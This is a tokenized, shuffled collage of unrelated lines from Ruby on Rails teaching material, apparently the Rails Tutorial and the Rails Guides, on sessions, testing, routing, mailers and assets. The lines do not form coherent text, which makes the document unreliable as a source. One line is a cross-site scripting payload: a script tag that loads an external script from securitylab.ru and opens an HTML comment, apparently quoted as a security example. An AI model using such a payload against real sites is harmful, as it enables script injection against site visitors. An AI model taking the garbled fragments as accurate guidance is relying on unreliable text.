▁Defaults ▁to ▁false ▁in ▁development ▁mode , ▁and ▁true ▁in ▁test ▁and ▁production ▁mode s ▖ ╼╼
▁Here ▁\ k ode { subl } ▁is ▁the ▁command - line ▁command ▁to ▁ la un ch ▁S ublime ▁Text ▁on ▁OS ~ X , ▁which ▁you ▁can ▁set ▁up ▁using ▁the ▁\ href { http :// www ▖ s ublime text ▖ com / docs / 2 / o s x _ command _ line ▖ html } { S ublime ▁Text ~ 2 ▁documentation ▁for ▁the ▁OS ~ X ▁command ▁line } .
▁Using ▁the ▁\ k ode { cookies } ▁method , ▁we ▁create ▁a ▁ persistent ▁session ▁by ▁ placing ▁a ▁ permanent ▁remember ▁token ▁cookie ▁on ▁the ▁browser .
▁### ▁Rendering ▁ Partial ▁Co ll ec tion s
▁In ▁particular , ▁the ▁base ▁title , ▁`` Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App '' , ▁is ▁the ▁same ▁for ▁every ▁title ▁test ▖ ▁Using ▁the ▁special ▁function ▁\ k ode { setup }, ▁which ▁is ▁automatically ▁run ▁before ▁every ▁test , ▁verify ▁that ▁the ▁tests ▁in ▁Listing ~\ ref { code : base _ title _ test } ▁are ▁ still ▁\ passing .
▁ Comm un ic ate ▁to ▁the ▁reader ▁the ▁current ▁way ▁of ▁doing ▁things , ▁both ▁explicitly ▁and ▁ implicit ly ▖
▁gem ▁' devise '
▁A nother ▁technique ▁related ▁to ▁models ▁involve s ▁undo ing ▁\ emph { migrations }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁and ▁will ▁see ▁much ▁more ▁of ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users } .
▁And ▁you ▁can ▁tell ▁the ▁method ▁not ▁to ▁fill ▁the ▁last ▁group ▁passing ▁` false `:
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : sign _ in _ function }
▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ store _ location } .
▁An ▁account ▁activation ▁email ▁sent ▁in ▁production .
▁### ▁Co mp let e ▁ List ▁of ▁Action ▁Mailer ▁ Methods
▁This ▁will ▁create ▁routing ▁helpers ▁such ▁as ▁` magazine _ period ical _ ads _ url ` ▁and ▁` edit _ magazine _ period ical _ ad _ path ` .
▁ ╼ ▁* ▁available ▁in ▁this ▁directory ▁and ▁any ▁sub - d ir ec to r ies .
▁# ▁if ▁you ' re ▁ sh ar ing ▁your ▁code ▁public ly .
▁* ▁How ▁to ▁run ▁ EXPLAIN ▁on ▁relation s .
▁The ▁Rails ▁ core ▁team ▁will ▁be ▁not if i ed ▁about ▁your ▁submission .
▁A ▁test ▁for ▁user ▁ logout ▖
▁ authenticated ?( : reset , ▁token )
▁create ▁app / controllers / application _ controller ▖ rb
▁* ▁The ▁` config ▖ assets ▖ compress ` ▁option ▁should ▁be ▁changed ▁to ▁` config ▖ assets ▖ js _ compressor ` ▁like ▁so ▁for ▁instance :
▁\ href { https :// www ▖ u de my ▖ com / learn - test - driven - development - in - ruby / co upon Code = hartl } { B al a ▁P ar an j ' s ▁ Test ▁D r ive n ▁Development ▁in ▁Ruby } : ▁A ▁more ▁advanced ▁online ▁course ▁focus ing ▁on ▁ TDD ▁in ▁p ure ▁Ruby
▁In ▁the ▁application ▁code , ▁the ▁\ k ode { following ?}\ ▁method ▁take s ▁in ▁a ▁user , ▁called ▁\ k ode { other \_ user }, ▁and ▁check s ▁to ▁see ▁if ▁a ▁followed ▁user ▁with ▁that ▁id ▁exists ▁in ▁the ▁database ; ▁the ▁\ k ode { follow !} \ ▁method ▁calls ▁\ k ode { create !} \ ▁through ▁the ▁\ k ode { relationships } ▁association ▁to ▁create ▁the ▁following ▁relationship .
▁in ▁Listing ~\ ref { code : layout _ signin _ signout _ links } .
▁The ▁` find _ by _ sql ` ▁method ▁will ▁return ▁an ▁array ▁of ▁objects ▁even ▁if ▁the ▁under ly ing ▁query ▁returns ▁just ▁a ▁single ▁record ▖
▁The ▁meaning ▁of ▁the ▁prefix ▁column ▁( and ▁other ▁columns )╼ will ▁be ▁seen ▁later , ▁but ▁for ▁now ▁notice ▁that ▁Rails ▁has ▁inferred ▁the ╼ singular ▁form ▁` article ` ▁and ▁make s ▁meaning ful ▁use ▁of ▁the ▁ distinct ion .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁Static ▁Pages .
▁< script ▁src = http :// www ▖ security lab ▖ ru / test / s c ▖ js ></ script >< ! - -
▁Re p la ce ▁\ k ode {" subl ▁- w "} ▁with ▁\ k ode {" m ate ▁- w "} ▁for ▁ TextMate , ▁\ k ode {" gvim ▁- f "} ▁for ▁g V im , ▁or ▁\ k ode {" mv im ▁- f "} ▁for ▁M ac V im .
▁With ▁something ▁as ▁d angerous ▁as ▁destroying ▁users , ▁it ' s ▁important ▁to ▁have ▁good ▁tests ▁for ▁the ▁expected ▁behavior .
▁Inde x ▁action ▁with ▁edit ▁link ]( images / getting _ started / index _ action _ with _ edit _ link ▖ png )
▁# ▁=> ▁30 2▖2 4 3 99 %
▁# ▁Find ▁the ▁client ▁with ▁primary ▁key ▁( id ) ▁10 .
▁objects ▁do ▁not ▁even ▁respond ▁to ▁` blank ?` ▖
▁user - microposts
▁Return ▁the ▁User ▁object ▁ associated ▁with ▁the ▁micropost .
▁A ▁mockup ▁of ▁the ▁user ▁followers ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / followers _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁S ince ▁we ▁have ▁no ▁need ▁to ▁show ▁or ▁edit ▁sessions , ▁we ' ve ▁restrict ed ▁the ▁actions ▁to ▁\ k ode { new }, ▁\ k ode { create }, ▁and ▁\ k ode { destroy } ▁using ▁the ▁\ k ode { : only } ▁option ▁accepted ▁by ▁\ k ode { resources } .
▁The ▁date ▁and ▁time ▁is ▁<%= ▁Time ▖ now ▁%></ p >
▁d ▖ beginning _ of _ year ▁# ▁=> ▁Fri , ▁01 ▁Jan ▁2010
▁For ▁example , ▁to ▁open ▁the ▁sample ▁app ▁in ▁S ublime ▁Text , ▁you ▁type
▁# ▁E x p and s ▁the ▁lines ▁which ▁load ▁the ▁assets
▁In st all ▁Git
▁This ▁line ▁will ▁m o un t ▁the ▁engine ▁at ▁` / blog ` ▁in ▁the ▁application ▖
▁config ▖ assets ▖ compress ▁= ▁false
▁You ▁can ▁also ▁disable ▁generation ▁of ▁controller ▁specific ▁asset ▁files ▁by ▁adding ▁the ╼ following ▁to ▁your ▁` config / application ▖ rb ` ▁configuration :
▁( I ▁don ' t ▁know ▁which ▁is ▁co ol er : ▁that ▁Ruby ▁let s ▁you ▁add ▁methods ▁to ▁built - in ▁classes , ▁or ▁that ▁\ k ode {" de if i ed "} ▁is ▁a ▁ palindrome ▖)
▁You ▁can ▁either ▁open ▁a ▁pull ▁request ▁to ▁[ Rails ]( http :// github ▖ com / rails / rails ) ▁or ╼ as k ▁the ▁[ Rails ▁ core ▁team ]( http :// rubyonrails ▖ org / core ) ▁for ▁commit ▁access ▁on
▁In ▁other ▁words , ▁\ k ode { object : ▁f ▖ object } ▁creates ▁a ▁variable ▁called ▁\ k ode { object } ▁in ▁the ▁\ k ode { error \_ messages } ▁partial .
▁delete ▁a ▁session ▁( sign ▁out )
▁Tests ▁for ▁the ▁named ▁routes .
▁Rails ▁uses ▁the ▁standard ▁file ▁\ k ode { db / seed s ▖ rb } ▁to ▁ seed ▁the ▁database ▁with ▁sample ▁data ▁using ▁\ k ode { rake ▁db : seed } .
▁The ▁\ k ode { presence : ▁true } ▁argument ▁is ▁a ▁one - e le ment ▁\ emph { options ▁hash } ; ▁recall ▁from ▁Section ~\ ref { sec : css _ revisited } ▁that ▁ curl y ▁braces ▁are ▁optional ▁when ▁passing ▁hashes ▁as ▁the ▁final ▁argument ▁in ▁a ▁method .
▁gem ▁' rails ', ▁' 3▖1 ▖ 12 '
▁process _ with out _ stringified _ params ( action , ▁params , ▁session , ▁flash , ▁ http _ method )
▁A ▁test ▁implement ing ▁the ▁above ▁steps ▁appears ▁in ▁Listing ~\ ref { code : flash _ persistence _ test } .
▁This ▁is ▁a ▁first ▁important ▁step ▁toward ▁allow ing ▁users ▁to ▁ register ▁for ▁our ▁site ; ▁we ' ll ▁take ▁the ▁next ▁step , ▁ modeling ▁users , ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁and ▁we ' ll ▁finish ▁the ▁job ▁in ▁Chapter ~\ ref { cha : sign _ up } .
▁ / users
▁ today ?
▁Now ▁that ▁our ▁login ▁form ▁can ▁handle ▁invalid ▁submission s , ▁the ▁next ▁step ▁is ▁to ▁handle ▁valid ▁submission s ▁correctly ▁by ▁actually ▁logging ▁a ▁user ▁in .
▁This ▁method ▁determine s ▁if ▁a ▁given ▁password ▁is ▁valid ▁for ▁a ▁particular ▁user ▁by ▁ com put ing ▁its ▁digest ▁and ▁compar ing ▁the ▁result ▁to ▁\ k ode { password \_ digest } ▁in ▁the ▁database .
▁When ▁you ▁confirm ▁the ▁overwrit ing ▁of ▁the ▁` config / database ▖ yml ` ▁file , ▁your ▁application ▁will ▁be ▁configured ▁for ▁ MySQL ▁instead ▁of ▁SQLite ▖
▁ delegate ▁: name , ▁to : ▁: profile , ▁allow _ nil : ▁true
▁For ▁the ▁account ▁activation ▁mailer ▁method , ▁they ▁appear ▁as ▁in ▁Listing ~\ ref { code : generated _ account _ activation _ view _ text } ▁and ▁Listing ~\ ref { code : generated _ account _ activation _ view _ html } .
▁( The ▁key ▁\ k ode { : success } ▁is ▁a ▁symbol , ▁but ▁ embedded ▁Ruby ▁automatically ▁convert s ▁it ▁to ▁the ▁string ▁\ k ode {" success "} ▁before ▁insert ing ▁it ▁into ▁the ▁template ▖)
▁( You ▁will ▁have ▁to ▁create ▁both ▁the ▁\ k ode { spec / helpers } ▁directory ▁and ▁the ▁\ k ode { application \_ helper \_ spec ▖ rb } ▁file ▖)
▁To get her ▁with ▁the ▁natural - language ▁syntax ▁provided ▁by ▁Capybara , ▁integration ▁tests ▁provide ▁a ▁powerful ▁method ▁to ▁test ▁our ▁application ' s ▁functionality ▁without ▁ having ▁to ▁manually ▁check ▁each ▁page ▁with ▁a ▁browser .
▁ ActiveSupport :: JSON :: Encoding ▖ time _ precision ▁= ▁0
▁# ▁=> ▁Thu , ▁01 ▁Ju l ▁2010 ▁00:00:00 ▁UTC ▁+00:00 ▖ .
▁( Listing ~\ ref { code : followers _ test } ▁m ight ▁have ▁used ▁a ▁\ k ode { followed \_ by ?}\ ▁method ▁to ▁complement ▁the ▁\ k ode { following ?}\ ▁method , ▁but ▁it ▁turn s ▁out ▁we ▁won ' t ▁need ▁it ▁in ▁our ▁application ▖)
▁When ▁you ▁set ▁up ▁a ▁regular ▁route , ▁you ▁supply ▁a ▁series ▁of ▁symbols ▁that ▁Rails ▁map s ▁to ▁parts ▁of ▁an ▁in com ing ▁HTTP ▁request ▖
▁=> ▁#< User ▁id : ▁nil , ▁name : ▁nil , ▁email : ▁nil , ▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }) ▁with ▁an ▁added ▁ footer ▖ ~\ href { http :// railstutorial ▖ org / images / figures / site _ with _ footer _ bootstrap _4_0 - full ▖ png }{( full ▁size )}
▁To ▁avoid ▁need less ▁repetition , ▁we ' ll ▁write ▁a ▁helper ▁method ▁called ▁\ k ode { log \_ in \_ as } ▁to ▁log ▁in ▁for ▁us .
▁% w ( a ▁b ▁c ▁d )▖ append (' e ') ▁# ▁=> ▁% w ( a ▁b ▁c ▁d ▁e )
▁WARNING ▖ ▁Note ▁that ▁some ▁database s ▁are ▁configured ▁to ▁perform ▁case - insensitive ╼ search es ▁any way .
▁Note ▁here ▁the ▁use ▁of ▁\ k ode { before (: all ) }, ▁which ▁ensure s ▁that ▁the ▁sample ▁users ▁are ▁created ▁\ emph { once }, ▁before ▁all ▁the ▁tests ▁in ▁the ▁block .
▁In ▁database ▁terms , ▁this ▁association ▁say s ▁that ▁the ▁other ▁class ▁contains ▁the ▁foreign ▁key ▖
▁You ▁will ▁want ▁to ▁ rescue ▁this ▁exception ▁instead ▁of ▁the ▁ low - level ▁` M ul t i J s on :: D e code Error `, ▁for ▁example .
▁#### # ▁` extending `
▁You ▁don ' t ▁need ▁to ▁tell ▁it ▁any ▁more ▁than ╼ this .
▁ Mail ing ▁the ▁password ▁reset ▁link .
▁Client ▖ where ( first _ name : ▁' Ryan ')▖ count
▁It ' s ▁convenient ▁to ▁use ▁the ▁\ k ode { full \_ title } ▁helper ▁in ▁the ▁tests ▁by ▁including ▁the ▁Application ▁helper ▁into ▁the ▁test ▁helper , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ application _ helper } .
▁Check ▁your ▁CDN ▁documentation ▁for ▁any ▁ additional ▁information ▁they ▁may ▁provide ╼ such ▁as ▁` X - Cache ` ▁or ▁for ▁any ▁ additional ▁headers ▁they ▁may ▁add .
▁For ▁cases ▁such ▁as ▁the ▁one ▁in ▁this ▁chapter , ▁the ▁advantage ▁over ▁Active ▁Record ▁may ▁not ▁be ▁obvious , ▁but ▁we ' ll ▁use ▁more ▁advanced ▁features ▁of ▁ factor ies ▁in ▁future ▁chapter s .
▁Next , ▁we ' ll ▁add ▁validations ▁for ▁the ▁micropost ' s ▁\ k ode { content } ▁attribute ▁( following ▁the ▁example ▁from ▁Section ~\ ref { sec : putting _ the _ micro _ in _ microposts }) .
▁To ▁configure ▁our ▁application ▁to ▁use ▁ SendGrid , ▁we ▁need ▁to ▁fill ▁out ▁the ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / Simple _ Mail _ Transfer _ Protocol } { SMTP } ▁settings ▁for ▁our ▁production ▁environment .
▁<%= ▁image _ tag ▁" home ▖ g if ", ▁ alt : ▁" Home " ▁%>
▁= ================ ================ ==
▁B oth ▁of ▁these ▁nesting ▁technique s ▁apply ▁to ▁the ▁ footer ▁CSS ▁in ▁Listing ~\ ref { code : footer _ css }, ▁which ▁can ▁be ▁ transform ed ▁into ▁the ▁following :
▁and ▁so ▁on ▁for ▁the ▁other ▁pages .
▁### ▁Configur ing ▁Action ▁Mailer
▁P utting ▁an ▁index ▁on ▁the ▁email ▁column ▁fix es ▁the ▁problem .
▁With ▁that , ▁all ▁we ▁have ▁left ▁is ▁to ▁ initialize ▁the ▁Git ▁repository
▁| ▁PATCH / PUT ▁| ▁ / magazine s / : magazine _ id / ads / : id ▁| ▁ ads # update ▁| ▁update ▁a ▁specific ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁This ▁will ▁find ▁all ▁clients ▁where ▁the ▁` orders _ count ` ▁field ' s ▁value ▁is ▁2 .
▁create ▁test / models / blorgh / comment _ test ▖ rb
▁With ▁the ▁call ▁to ▁` extract _ options !` ▁you ▁obtain ▁the ▁options ▁hash ▁and ▁remove ▁it ▁from ▁` action s ` ▁in ▁a ▁simple ▁and ▁explicit ▁way .
▁# ▁ ActiveSupport ▖ on _ load (: active _ record ) ▁do
▁4 3 , ▁ 44 , ▁ 45 , ▁4 6 , ▁4 7 , ▁ 48 , ▁4 9 , ▁50 , ▁ 51 ]
▁through : ▁: orders
▁< form ▁action ="/ people / create " ▁method =" post ">
▁options ▁= ▁options ▖ stringify _ keys
▁before _ save ▁: set _ author
▁ NoMethodError : ▁undefined ▁method ▁` split ' ▁for ▁: name : Symbol
▁This ▁means ▁that ▁you ▁will ▁be ▁able ▁to ▁generate ▁new ▁controllers ▁and ▁models ▁for ▁this ╼ engine ▁very ▁easily ▁by ▁running ▁commands ▁like ▁this :
▁scope ▁' / admin ' ▁do
▁Now ▁that ▁new ▁users ▁can ▁sign ▁up ▁for ▁our ▁site ▁( Chapter ~\ ref { cha : sign _ up }), ▁it ' s ▁time ▁to ▁give ▁them ▁the ▁ability ▁to ▁log ▁in ▁and ▁log ▁out .
▁The ▁method ▁` missing _ name ?` ▁provides ▁a ▁way ▁to ▁distinguish ▁both ▁cases :
▁They ' ve ▁been ▁t ra in ed ▁that ▁when ever ▁they ▁try ▁to ▁install ▁something , ▁or ▁even ▁fill ▁out ▁a ▁form ▁online , ▁it ' s ▁not ▁going ▁to ▁work .
▁If ▁you ▁want ▁to ▁send ▁email s ▁right ▁a way ▁( from ▁a ▁c r on job ▁for ▁example ) ▁just ▁call ╼` deliver _ now `:
▁The ▁User ▁model ▁for ▁the ▁ demo ▁application .
▁<%= ▁image _ tag ▁" rails ▖ png " ▁%>
▁This ▁is ╼ another ▁part ▁of ▁cap t ur ing ▁the ▁ hi er ar ch ical ▁relationship ▁that ▁exists ▁between ╼ articles ▁and ▁comments .
▁A ▁common ▁pattern ▁for ▁using ▁a ▁CDN ▁is ▁to ▁set ▁your ▁production ▁application ▁as ▁the ╼ " origin " ▁server ▖
▁You ▁will ▁\ href { http :// stack overflow ▖ com / questions / 67 14 19 6 / ruby - url - en coding - string } { find ▁two ▁main ▁possibilities }, ▁\ k ode { URI :: en code ( str )} ▁and ▁\ k ode { C G I :: escape ( str )} .
▁We ' ll ▁also ▁add ▁an ▁ associated ▁\ k ode { following ?}\ ▁boolean ▁method ▁to ▁test ▁if ▁one ▁user ▁is ▁following ▁another
▁As ▁a ▁pre r equ i site , ▁OS ~ X ▁users ▁may ▁need ▁to ▁install ▁the ▁X code ▁developer ▁tool s .
▁* ▁` eager _ load !` ▁If ▁` config ▖ eager _ load ` ▁is ▁true , ▁run s ▁the ▁` config ▖ before _ eager _ load ` ▁ hook s ▁and ▁then ▁calls ▁` eager _ load !` ▁which ▁will ▁load ▁all ▁` config ▖ eager _ load _ namespace s ` .
▁As ▁a ▁final ▁step , ▁we ' ll ▁see ▁how ▁to ▁make ▁ st a y ing ▁logged ▁in ▁optional ▁using ▁a ▁`` remember ▁me '' ▁checkbox .
▁#### # ▁` collection ▖ size `
▁use ▁ActiveRecord :: Query Cache
▁ Each ▁test ▁simply ▁get s ▁an ▁action ▁and ▁verifie s ▁( via ▁an ▁\ emph { assert ion }) ▁that ▁the ▁result ▁is ▁a ▁ success .
▁The ▁` app / views / users / _ user ▖ html ▖ erb ` ▁partial ▁contains ▁the ▁following :
▁A nother ▁technique ▁related ▁to ▁models ▁involve s ▁undo ing ▁\ emph { migrations }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ demo _ app } ▁and ▁will ▁see ▁much ▁more ▁of ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users } .
▁Use d ▁internally ▁by ▁` image _ tag ` ▁to ▁build ▁the ▁image ▁path .
▁Start ▁users ▁in ▁an ▁`` unactivated '' ▁state .
▁There ▁may ▁be ▁an ▁instance ▁where ▁an ▁ internal ▁public ▁method ▁was n ' t ▁given ▁a ▁`: no doc : ` ▁by ▁mistake , ▁for ▁example ▁when ▁switch ing ▁a ▁method ▁from ▁ private ▁to ▁public ▁ v is i b i l ity ▖
▁As ▁you ▁m ight ▁expect , ▁we ▁use ▁the ▁\ k ode { find } ▁method ▁on ▁the ▁User ▁model ▁( Section ~\ ref { sec : find ing _ user _ objects }) ▁to ▁retrieve ▁the ▁user ▁from ▁the ▁database , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ action } .
▁next _ year
▁As sum ing ▁`@ products ` ▁is ▁a ▁collection ▁of ▁` Product ` ▁instance s , ▁you ▁can ▁simply ▁write ▁the ▁following ▁to ▁produce ▁the ▁same ▁result :
▁ Write ▁a ▁test ▁to ▁make ▁sure ▁that ▁ friendly ▁ forwarding ▁only ▁forward s ▁to ▁the ▁given ▁URL ▁the ▁first ▁time .
▁at ▁least ▁one ▁word ▁character , ▁plus , ▁hyphen , ▁or ▁do t
▁To ▁verify ▁the ▁behavior ▁of ▁the ▁`` remember ▁me '' ▁checkbox , ▁we ' ll ▁write ▁two ▁tests , ▁one ▁each ▁for ▁ submitting ▁with ▁and ▁without ▁the ▁checkbox ▁check ed .
▁( B y ▁the ▁way , ▁as ▁a ▁ preview ▁of ▁Ruby ' s ▁ compact ▁a wesome ness , ▁here ' s ▁the ▁code ▁I ▁used ▁to ▁generate ▁the ▁random ▁ subdomain s :
▁General ly , ▁a ▁feature ▁is ▁anything ▁that ▁add s ▁new ▁behavior , ▁while ▁a ▁bug ▁is ╼ any th ing ▁that ▁fix es ▁already ▁existing ▁behavior ▁that ▁is ▁ mis be having ▖
▁With ▁the ▁asset ▁pipeline , ▁we ▁don ' t ▁have ▁to ▁choose ▁between ▁ speed ▁and ▁convenience :
▁load ▁' deploy / assets '
▁add _ header ▁ ETag ▁" " ;
▁t ▖ string ▁: title
▁A part ▁from ▁the ▁site ▁ footer , ▁which ▁we ' ll ▁add ▁in ▁Section ~\ ref { sec : partial s }, ▁our ▁layout ▁is ▁now ▁complete , ▁and ▁we ▁can ▁look ▁at ▁the ▁results ▁by ▁visit ing ▁the ▁Home ▁page .
▁The ▁method ▁` next _ week ` ▁receive s ▁a ▁symbol ▁with ▁a ▁day ▁name ▁in ▁English ▁( default ▁is ▁the ▁thread ▁local ▁` Date ▖ beginning _ of _ week `, ▁or ▁` config ▖ beginning _ of _ week `, ▁or ▁`: monday ` ) ▁and ▁it ▁returns ▁the ▁date ▁corresponding ▁to ▁that ▁day .
▁in ▁Listing ~\ ref { code : layout _ signin _ signout _ links } ▁and
▁If ▁you ▁feel ▁over w h el m ed , ▁you ▁can ▁always ▁go ▁back ▁and ▁start ▁with ▁one ▁of ▁the ▁resources ▁list ed ▁below .
▁So , ▁where ▁does ▁the ▁pattern ▁come ▁from ?
▁For ▁example , ▁it ▁make s ▁more ▁sense ▁to ▁say ▁that ▁a ▁ supplier ▁own s ▁an ▁account ▁than ▁that ▁an ▁account ▁own s ▁a ▁ supplier ▖
▁( R ight ▁now , ▁of ▁course , ▁they ' ll ▁be ▁accepted ▁because ▁all ▁non - blank ▁email ▁addresses ▁are ▁current ly ▁valid ▖)
▁This ▁will ▁define ▁a ▁` user _ path ` ▁method ▁that ▁will ▁be ▁available ▁in ▁controllers , ▁helpers ▁and ▁views ▁that ▁will ▁go ▁to ▁a ▁route ▁such ▁as ▁` / bo b ` ▖
▁Then ▁we ' ll ▁make ▁a ▁ listing ▁of ▁all ▁users ▁( also ▁ requiring ▁authentication ), ▁which ▁will ▁m o t i v ate ▁the ▁introduction ▁of ▁sample ▁data ▁and ▁pagination .
▁* ▁To ▁re - en able ▁the ▁old ▁find ers , ▁you ▁can ▁use ▁the ▁[ active record - deprecated _ find ers ▁gem ]( https :// github ▖ com / rails / active record - deprecated _ find ers ) .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Users ▁resource ▁in ▁Listing ~\ ref { code : users _ resource } .
▁T hanks ▁to ▁reader ▁\ href { https :// twitter ▖ com / col m t uite } { C ol m ▁T uite } ▁for ▁his ▁excellent ▁work ▁in ▁help ing ▁to ▁convert ▁the ▁sample ▁application ▁over ▁to ▁Bootstrap .
▁ Compar ing ▁Listing ~\ ref { code : demo _ user _ class } ▁and ▁Listing ~\ ref { code : demo _ micropost _ class }, ▁we ▁see ▁that ▁both ▁the ▁User ▁model ▁and ▁the ▁Micropost ▁model ▁inherit ▁( via ▁the ▁left ▁an g le ▁bracket ~\ k ode { < }) ▁from ▁\ k ode { ActiveRecord :: Base }, ▁which ▁is ▁the ▁base ▁class ▁for ▁models ▁provided ▁by ▁ActiveRecord ; ▁a ▁diagram ▁summariz ing ▁this ▁relationship ▁appears ▁in ▁Figure ~\ ref { fig : demo _ model _ inheritance } .
▁This ▁ reload s ▁the ▁\ k ode { user } ▁variable ▁from ▁the ▁test ▁database ▁using ▁\ k ode { user ▖ reload }, ▁and ▁then ▁verifie s ▁that ▁the ▁user ' s ▁new ▁name ▁and ▁email ▁match ▁the ▁new ▁values .
▁This ▁means ▁that ▁if ▁some one ▁requests ▁an ▁asset ▁that ▁does ╼ not ▁exist ▁` / assets / i - do nt - ex ist ▖ png ` ▁and ▁your ▁Rails ▁application ▁returns ▁a ▁40 4 ,╼ the n ▁your ▁CDN ▁will ▁likely ▁cache ▁the ▁40 4 ▁page ▁if ▁a ▁valid ▁` Cache - Control ` ▁header ╼ is ▁present .
▁That ' s ▁fine , ▁the ▁helper ▁module ▁is ▁not ▁m and a to ry ▁so ▁Rails ▁ silence s ▁a ▁load ▁error ▖
▁Add ▁tests ▁for ▁the ▁ sidebar ▁micropost ▁count ▁( including ▁proper ▁plural i z ation ) .
▁A c ce p t s ▁a ▁ container ▁( hash , ▁array , ▁ enumerable , ▁your ▁type ) ▁and ▁returns ▁a ▁string ▁of ▁option ▁tags .
▁A ▁pre li m in ary ▁implementation ▁for ▁the ▁micropost ▁status ▁feed .
▁A lthough ▁the ▁command ▁line ▁may ▁seem ▁p r im i tive ▁to ▁users ▁main ly ▁ familiar ▁with ▁gra ph ical ▁user ▁interface s ▁( GUI s ), ▁appearance s ▁are ▁ de ce i v ing : ▁the ▁command ▁line ▁is ▁one ▁of ▁the ▁most ▁powerful ▁tool s ▁in ▁the ▁developer ' s ▁tool box .
▁A ▁test ▁for ▁ forwarding ▁to ▁the ▁default ▁page ▁after ▁ friendly ▁ forwarding .
▁| ▁` { ▁" person " : ▁[ null , ▁ null , ▁▖▖▖ ] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁In ▁this ▁section , ▁we ' ll ▁implement ▁a ▁security ▁model ▁that ▁requires ▁users ▁to ▁be ▁signed ▁in ▁and ▁prevent s ▁them ▁from ▁updating ▁any ▁information ▁other ▁than ▁their ▁own .
▁=> ▁" aaaaaaaaaaaaaaaa a aaaaaaaaaa aaaaaaaaaa aaaaaaaaaaaaaaaa a a aaaaaaaaaaaaaaaa
▁t ▁= ▁Time ▖ local (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁T a k en ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : password _ reset } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁format ▖ text
▁The ▁result ing ▁Rails ▁Tutorial ▁ Cloud 9 ▁ workspace ▁comes ▁pre - configure d ▁with ▁most ▁of ▁the ▁software ▁needed ▁for ▁ professional - grade ▁Rails ▁development , ▁including ▁Ruby , ▁ RubyGems , ▁Git .
▁#### ▁ benchmark
▁The ▁site ▁layout ▁with ▁the ▁\ k ode { full \_ title } ▁helper ▖
▁The ▁About ▁page ▁with ▁HTML ▁structure ▁removed ▖
▁Fin ally , ▁we ' ll ▁put ▁the ▁toy ▁app ▁under ▁version ▁control ▁with ▁Git :
▁The ▁view ▁convert s ▁its ▁contents ▁to ▁HTML ▁( Step ~ 7 ), ▁which ▁is ▁then ▁returned ▁by ▁the ▁controller ▁to ▁the ▁browser ▁for ▁display ▁( Step ~ 8 ) .
▁We ▁could ▁fix ▁the ▁problem ▁by ▁ putting ▁\ k ode { root \_ url } ▁in ▁parentheses , ▁but ▁the ▁ idiomatic ally ▁correct ▁way ▁to ▁do ▁it ▁is ▁to ▁use ▁\ k ode { and } ▁instead .
▁Note ▁that , ▁while ▁the ▁\ k ode { each } ▁method ▁for ▁arrays ▁take s ▁a ▁block ▁with ▁only ▁one ▁variable , ▁\ k ode { each } ▁for ▁hashes ▁take s ▁two , ▁a ▁\ emph { key } ▁and ▁a ▁\ emph { value } .
▁Rails ▁understand s ▁both ▁ numeric ▁status ▁code s ▁and ▁the ▁corresponding ▁symbols ▁show n ▁below .
▁ umerate }╼╼ ▁% ▁subsection ▁the _ form _ html ▁( end )╼╼ ▁\ section { U n successful ▁signup s } ▁% ▁( fold )╼ ▁\ label { sec : unsuccessful _ signup s }╼╼
▁The ▁default ▁error ▁message ▁is ▁_" is ▁invalid " _ .
▁If ▁you ▁are ▁using ▁Rails ▁with ▁the ▁" Asset ▁Pipeline " ▁enabled , ▁this ▁helper ▁will ▁generate ▁a ▁link ▁to ▁` / assets / stylesheets / ` ▖
▁The ▁first ▁practical ▁application ▁of ▁logging ▁in ▁involve s ▁changing ▁the ▁layout ▁links ▁base d ▁on ▁login ▁status .
▁We ' re ▁now ▁ready ▁to ▁commit ▁the ▁changes ▁on ▁our ▁topic ▁branch ▁and ▁merge ▁back ▁to ▁master :
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁we ' ll ▁give ▁users ▁the ▁ability ▁to ▁sign ▁up ▁for ▁our ▁site ▁and ▁create ▁a ▁user ▁profile ▁page .
▁The ▁root ▁directory ▁for ▁any ▁given ▁app ▁is ▁known ▁as ▁the ▁\ emph { Rails ▁root }, ▁but ▁this ▁terminology ▁is ▁confusing ▁and ▁many ▁people ▁mistake n ly ▁believe ▁that ▁the ▁`` Rails ▁root '' ▁is ▁the ▁root ▁directory ▁for ▁Rails ▁itself .
▁Also ▁convert s ▁" :: " ▁back ▁to ▁"/ " :
▁ cha r set : ▁" UT F -8 ",
▁* ▁` proxy _ association ▖ target ` ▁returns ▁the ▁ associated ▁object ▁for ▁` belongs _ to ` ▁or ▁` has _ one `, ▁or ▁the ▁collection ▁of ▁ associated ▁objects ▁for ▁` has _ many ` ▁or ▁` has _ and _ belongs _ to _ many ` .
▁ Conditional ▁Validation
▁The ▁activation ▁email ▁will ▁involve ▁a ▁URL ▁of ▁the ▁form
▁Note ▁the ▁inclusion ▁of
▁H app ily , ▁though , ▁we ' ve ▁done ▁a ▁good ▁job ▁of ▁giv ing ▁our ▁HTML ▁elements ▁ s en s ible ▁classes , ▁which ▁ puts ▁us ▁in ▁a ▁great ▁position ▁to ▁add ▁style ▁to ▁the ▁site ▁with ▁CSS .
▁page ▁to ▁show ▁user ▁with ▁id ▁\ text tt {1}
